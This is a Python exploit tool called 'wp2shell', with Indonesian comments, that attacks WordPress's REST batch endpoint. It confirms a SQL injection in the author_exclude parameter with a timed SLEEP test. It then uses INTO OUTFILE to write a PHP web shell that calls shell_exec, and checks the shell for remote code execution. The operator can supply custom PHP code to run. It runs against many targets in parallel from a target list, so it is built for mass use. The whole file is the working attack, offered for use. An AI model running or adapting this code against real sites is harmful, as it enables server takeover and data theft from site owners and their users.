#!/usr/bin/env python3
# wp2shell_intooutfile_batch.py - Improved version with custom options & colors

import os
import sys
import json
import time
import argparse
import urllib.request
import urllib.parse
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================================
# COLOR & BANNER
# ============================================================================

def color(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if sys.stdout.isatty() else text

def red(text): return color("31", text)
def green(text): return color("32", text)
def yellow(text): return color("33", text)
def blue(text): return color("34", text)
def magenta(text): return color("35", text)
def cyan(text): return color("36", text)
def bold(text): return color("1", text)

BANNER = r"""
              ___      __       ____
 _    _____  |_  |___ / /  ___ / / /
| |/|/ / _ \/ __/(_-</ _ \/ -_) / / 
|__,__/ .__/____/___/_//_/\__/_/_/  
     /_/                            
"""

# ============================================================================
# KONFIGURASI DEFAULT
# ============================================================================

OUTFILE = "/var/lib/mysql-files/oo.php"
DROPPER = '<?php echo "[rce] " . shell_exec("id"); ?>'

# ============================================================================
# FUNGSI UTAMA
# ============================================================================

def normalize_url(target):
    """Tambahkan https:// jika tidak ada protokol"""
    target = target.strip()
    if not target.startswith(("http://", "https://")):
        return "https://" + target
    return target

def _post(target, body, timeout=30, rest_route=False):
    target = normalize_url(target)
    if rest_route:
        batch_url = target.rstrip("/") + "/wp-json/batch/v1"
    else:
        batch_url = target.rstrip("/") + "/?rest_route=/batch/v1"
    
    req = urllib.request.Request(
        batch_url,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, str(e)

def fire(target, sqli, timeout=30, rest_route=False):
    target = normalize_url(target)
    enc = urllib.parse.quote
    
    inner = {"validation": "normal", "requests": [
        {"path": "http://"},
        {"path": "/wp/v2/categories?author_exclude=" + enc(sqli),
         "method": "POST", "body": {"name": "x", "orderby": False}},
        {"path": "/wp/v2/posts", "method": "GET"},
    ]}
    
    outer = {"validation": "normal", "requests": [
        {"path": "http://"},
        {"path": "/wp/v2/posts", "body": inner},
        {"path": "/batch/v1"},
    ]}
    
    return _post(target, outer, timeout, rest_route)

def exploit_target(target, timeout=30, verbose=True, rest_route=False, outfile=None, dropper=None):
    target = normalize_url(target)
    target = target.rstrip("/")
    
    if verbose:
        print(f"\n{'='*60}")
        print(f"{cyan('[*] TARGET:')} {target}")
        print(f"{'='*60}")
    
    # Gunakan custom outfile atau default
    target_outfile = outfile if outfile else OUTFILE
    target_dropper = dropper if dropper else DROPPER
    
    try:
        t = time.time()
        fire(target, "0) OR SLEEP(3)-- -", timeout, rest_route)
        elapsed = time.time() - t
    except Exception as e:
        if verbose:
            print(f"{red('[-] Error:')} {e}")
        return {"target": target, "status": "ERROR", "error": str(e)}
    
    if elapsed < 1.0:
        if verbose:
            print(f"{red('[-] No delay')} ({elapsed:.2f}s) - not vulnerable or timeout")
        return {"target": target, "status": "NOT_VULNERABLE", "delay": elapsed}
    
    if verbose:
        print(f"{green('[+] SQL Injection confirmed!')} (delay: {elapsed:.2f}s)")
    
    payload = (f"0) AND 1=0 UNION SELECT '{target_dropper}' INTO OUTFILE '{target_outfile}'-- -")
    code, _ = fire(target, payload, timeout, rest_route)
    
    if code != 207:
        if verbose:
            print(f"{red('[-] Batch returned')} {code} {red('(expected 207)')}")
        return {"target": target, "status": "OUTFILE_FAILED", "batch_code": code}
    
    # Ambil nama file dari path outfile
    shell_filename = os.path.basename(target_outfile)
    shell_url = target + "/rce/" + shell_filename
    time.sleep(0.5)
    
    try:
        req = urllib.request.Request(shell_url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            out = r.read().decode("utf-8", "replace")
    except Exception as e:
        if verbose:
            print(f"{red('[-] Error fetching shell:')} {e}")
        return {"target": target, "status": "SHELL_FETCH_FAILED", "error": str(e)}
    
    if "[rce]" in out:
        if verbose:
            print(f"{green('[+] RCE CONFIRMED on')} {target}!")
        return {"target": target, "status": "RCE_SUCCESS", "output": out.strip()}
    else:
        if verbose:
            print(f"{red('[-] No RCE output')}")
        return {"target": target, "status": "RCE_FAILED", "output": out[:200]}

def main():
    parser = argparse.ArgumentParser(
        description="wp2shell INTO OUTFILE RCE - Multiple Targets",
        epilog="Example: python wp2shell_intooutfile.py -f list.txt -t 10 --outfile /tmp/shell.php"
    )
    parser.add_argument("-f", "--file", help="File with target URLs (one per line)")
    parser.add_argument("targets", nargs="*", help="Target URL(s)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Threads (default: 5)")
    parser.add_argument("--timeout", type=int, default=30, help="Timeout (default: 30)")
    parser.add_argument("-o", "--output", help="Save results to file")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    
    # ===== FITUR TAMBAHAN =====
    parser.add_argument("--outfile", help="Custom MySQL OUTFILE path (default: /var/lib/mysql-files/oo.php)")
    parser.add_argument("--dropper", help="Custom PHP code to execute (default: id)")
    parser.add_argument("--rest-route", action="store_true", help="Use /wp-json/batch/v1 instead of /?rest_route=/batch/v1")
    # =========================
    
    args = parser.parse_args()
    
    targets = list(args.targets)
    
    if args.file:
        try:
            with open(args.file) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except FileNotFoundError:
            print(f"{red('[-] File not found:')} {args.file}")
            sys.exit(1)
    
    targets = list(dict.fromkeys(targets))
    
    # Tampilkan Banner
    print(cyan(BANNER))
    print(bold(f"  wp2shell INTO OUTFILE Exploit | Target: {len(targets)} | Threads: {args.threads}"))
    print("  " + "=" * 60)
    print()
    
    print(f"{cyan('[*] Total targets:')} {len(targets)}")
    print(f"{cyan('[*] Threads:')} {args.threads}")
    if args.outfile:
        print(f"{cyan('[*] OUTFILE:')} {args.outfile}")
    if args.dropper:
        print(f"{cyan('[*] Dropper:')} {args.dropper[:50]}...")
    if args.rest_route:
        print(f"{cyan('[*] Endpoint:')} /wp-json/batch/v1")
    else:
        print(f"{cyan('[*] Endpoint:')} /?rest_route=/batch/v1")
    print("-" * 60)
    
    results = []
    successful = 0
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_target = {
            executor.submit(
                exploit_target, 
                target, 
                args.timeout, 
                not args.quiet,
                args.rest_route,
                args.outfile,
                args.dropper
            ): target
            for target in targets
        }
        
        for future in as_completed(future_to_target):
            target = future_to_target[future]
            try:
                result = future.result()
                results.append(result)
                if result.get("status") == "RCE_SUCCESS":
                    successful += 1
                    print(f"\n{green('[+] RCE SUCCESS:')} {target}")
                elif result.get("status") == "NOT_VULNERABLE":
                    print(f"\n{yellow('[-] NOT VULNERABLE:')} {target}")
                else:
                    print(f"\n{red('[-] FAILED:')} {target} - {result.get('status', 'unknown')}")
            except Exception as e:
                print(f"\n{red('[-] ERROR:')} {target} - {e}")
                results.append({"target": target, "status": "EXCEPTION", "error": str(e)})
    
    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    print(f"Total targets:  {len(targets)}")
    if successful > 0:
        print(f"{green('RCE Successful:')} {successful}")
    else:
        print(f"{red('RCE Successful:')} {successful}")
    
    if args.output:
        try:
            with open(args.output, "w") as f:
                f.write("# wp2shell INTO OUTFILE Results\n")
                f.write(f"# Total: {len(targets)} | Successful: {successful}\n\n")
                for r in results:
                    f.write(f"[{r.get('status', 'UNKNOWN')}] {r.get('target', '')}\n")
                    if r.get("status") == "RCE_SUCCESS":
                        f.write(f"  Output: {r.get('output', '')[:100]}\n")
            print(f"\n{green('✅ Results saved to:')} {args.output}")
        except Exception as e:
            print(f"\n{red('❌ Failed to save:')} {e}")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
